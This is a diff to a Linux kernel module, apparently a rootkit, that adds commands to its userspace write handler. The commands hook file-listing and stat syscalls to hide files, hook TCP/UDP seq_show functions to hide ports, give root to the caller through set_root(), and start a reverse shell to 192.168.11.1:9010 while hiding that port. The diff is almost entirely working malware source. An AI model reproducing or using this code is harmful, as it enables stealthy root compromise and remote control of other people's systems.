@@ -30,6 +30,8 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         printk("Userspace -> kernel copy failed!\n");
         return -1;
     }
+
+    // can switch all the if's with data structure :| , (command-function)
     if(memcmp("hide ", tmpdata, strlen("hide ")) == 0){
         if(strlen(tmpdata) > strlen("hide ") + 3){
             strcpy(last_data, tmpdata + strlen("hide "));
@@ -102,6 +104,89 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
             remove_node_by_name(&exec_to_block, last_data);
         }
     }
+
+    #ifdef PTREGS_SYSCALL_STUB
+    if(memcmp("hide-files", tmpdata, strlen("hide-files")) == 0){
+        if(strlen(tmpdata) > strlen("hide-files")){
+            strcpy(last_data, tmpdata);
+            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents64") == 1){
+                printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents64);
+            }
+            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents") == 1){
+                printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents);
+            }
+            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_openat") == 1){
+                printk(KERN_ERR "error hooking syscall openat\n");
+            }
+            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_pread64") == 1){
+                printk(KERN_ERR "error hooking syscall openat\n");
+            }
+            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_statx") == 1){
+                printk(KERN_ERR "error hooking syscall statx\n");
+            }
+        }
+    }
+    #else
+    if(memcmp("hide-files", tmpdata, strlen("hide-files")) == 0){
+        if(strlen(tmpdata) > strlen("hide-files")){
+            strcpy(last_data, tmpdata);
+            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents64") == 1){
+                printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents64);
+            }
+            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents") == 1){
+                printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents);
+            }
+            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_openat") == 1){
+                printk(KERN_ERR "error hooking syscall openat\n");
+            }
+            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_pread64") == 1){
+                printk(KERN_ERR "error hooking syscall openat\n");
+            }
+            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_statx") == 1){
+                printk(KERN_ERR "error hooking syscall statx\n");
+            }
+        }
+    }
+    #endif
+
+    if(memcmp("hide-ports", tmpdata, strlen("hide-ports")) == 0){
+        if(strlen(tmpdata) > strlen("hide-ports")){
+            strcpy(last_data, tmpdata);
+            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"tcp4_seq_show") == 1){
+                printk(KERN_ERR "error hooking tcp4_seq_show\n");
+            }
+            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"tcp6_seq_show") == 1){
+                printk(KERN_ERR "error hooking tcp6_seq_show\n");
+            }
+            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"udp4_seq_show") == 1){
+                printk(KERN_ERR "error hooking udp4_seq_show\n");
+            }
+            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"udp6_seq_show") == 1){
+                printk(KERN_ERR "error hooking udp6_seq_show\n");
+            }
+        }
+    }
+
+
+    if(memcmp("elevate", tmpdata, strlen("elevate")) == 0){
+        if(strlen(tmpdata) > strlen("elevate")){
+            strcpy(last_data, tmpdata);
+            printk(KERN_INFO "Setting root for calling process\n");
+            set_root();
+            return 0;
+        }
+    }
+
+    if(memcmp("reverse-me", tmpdata, strlen("reverse-me")) == 0){
+        if(strlen(tmpdata) > strlen("reverse-me")){
+            strcpy(last_data, tmpdata);
+            start_reverse_shell("192.168.11.1", "9010");
+            insert_node(&ports_to_hide, "9010");
+        }
+    }
+
+
+    
     return 0;
 }
 
